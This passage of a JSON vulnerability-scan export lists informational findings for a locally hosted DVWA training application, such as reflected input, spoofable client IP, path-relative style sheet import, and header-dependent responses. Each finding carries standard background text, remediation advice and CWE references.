        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "66": {
        "\ufeffissue__serialNumber": "3.1823E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/captcha/",
        "issue__location": "/dvwa/vulnerabilities/captcha/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "67": {
        "\ufeffissue__serialNumber": "2.65113E+18",
        "issue__type": "4194576",
        "issue__name": "Spoofable client IP address",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>\\nIf an application trusts an HTTP request header like X-Forwarded-For to accurately specify the remote IP address of the connecting client, then malicious clients can spoof their IP address. This behavior does not necessarily constitute a security vulnerability, however some applications use client IP addresses to enforce access controls and rate limits. For example, an application might expose administrative functionality only to clients connecting from the local IP address of the server, or allow a certain number of failed login attempts from each unique IP address.\\nConsider reviewing relevant functionality to determine whether this might be the case. </p>",
        "issue__remediationBackground": "<p>HTTP request headers such as X-Forwarded-For, True-Client-IP, and X-Real-IP are not a robust foundation on which to build any security measures, such as access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to spoofing.</p>\\n<p>If the platform application server returns incorrect information about the client's IP address due to the presence of any particular HTTP request header, then the server may need to be reconfigured, or an alternative method of identifying clients should be used. </p>",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "68": {
        "\ufeffissue__serialNumber": "6.58955E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/ids_log.php",
        "issue__location": "/dvwa/ids_log.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "69": {
        "\ufeffissue__serialNumber": "4.23114E+18",
        "issue__type": "4194592",
        "issue__name": "User agent-dependent response",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Application responses may depend systematically on the value of the User-Agent header in requests. This behavior does not itself constitute a security vulnerability, but may point towards additional attack surface within the application, which may contain vulnerabilities.</p>\\n<p>This behavior often arises because applications provide different user interfaces for desktop and mobile users. Mobile interfaces have often been less thoroughly tested for vulnerabilities such as cross-site scripting, and often have simpler authentication and session handling mechanisms that may contain problems that are not present in the full interface.</p>\\n<p>To review the interface provided by the alternate User-Agent header, you can configure a match/replace rule in Burp Proxy to modify the User-Agent header in all requests, and then browse the application in the normal way using your normal browser. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "70": {
        "\ufeffissue__serialNumber": "5.0471E+18",
        "issue__type": "4194560",
        "issue__name": "Referer-dependent response",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Application responses may depend systematically on the presence or absence of the Referer header in requests. This behavior does not necessarily constitute a security vulnerability, and you should investigate the nature of and reason for the differential responses to determine whether a vulnerability is present.</p>\\n<p>Common explanations for Referer-dependent responses include: </p>\\n<ul><li>Referer-based access controls, where the application assumes that if you have arrived from one privileged location then you are authorized to access another privileged location. These controls can be trivially defeated by supplying an accepted Referer header in requests for the vulnerable function.</li><li>Attempts to prevent cross-site request forgery attacks by verifying that requests to perform privileged actions originated from within the application itself and not from some external location. Such defenses are often not robust, and can be bypassed by removing the Referer header entirely.</li>\\n<li>Delivery of Referer-tailored content, such as welcome messages to visitors from specific domains, search-engine optimization (SEO) techniques, and other ways of tailoring the user's experience. Such behaviors often have no security impact; however, unsafe processing of the Referer header may introduce vulnerabilities such as SQL injection and cross-site scripting. If parts of the document (such as META keywords) are updated based on search engine queries contained in the Referer header, then the application may be vulnerable to persistent code injection attacks, in which search terms are manipulated to cause malicious content to appear in responses served to other application users.</li></ul>",
        "issue__remediationBackground": "<p>The Referer header is not a robust foundation on which to build access controls. Any such measures should be replaced with more secure alternatives that are not vulnerable to Referer spoofing.</p>\\n<p>If the contents of responses is updated based on Referer data, then the same defenses against malicious input should be employed here as for any other kinds of user-supplied data. </p>",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/213.html\">CWE-213: Intentional Information Exposure</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "71": {
        "\ufeffissue__serialNumber": "6.57659E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/brute/",
        "issue__location": "/dvwa/vulnerabilities/brute/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "72": {
        "\ufeffissue__serialNumber": "1.42934E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/upload/",
        "issue__location": "/dvwa/vulnerabilities/upload/ [filename multipart parameter attribute]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
